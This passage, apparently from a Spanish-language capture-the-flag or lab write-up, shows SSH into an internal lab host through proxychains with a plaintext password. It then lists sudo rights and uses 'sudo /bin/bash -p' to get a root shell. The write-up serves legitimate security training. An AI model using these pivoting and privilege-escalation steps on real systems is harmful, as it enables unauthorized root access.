+sin resultados, asi que pruebo con el user rayito y obtengo resultados por ssh
+
+proxychains4 ssh rayito@30.30.30.3
+pass:electrocut4c10n!
+
+sudo -l
+
+User rayito may run the following commands on 4be43da47075:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+
+como en las maquinas anteriores, esta ejecuta cualquier binario como root, asi que:
+
+sudo /bin/bash -p
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+PD: la idea de la maquina era aprender privoting con Ligolo-ng, sin embargo yo la he resulto con 
+    socat y chisel ya que es la forma que mas domino ;)
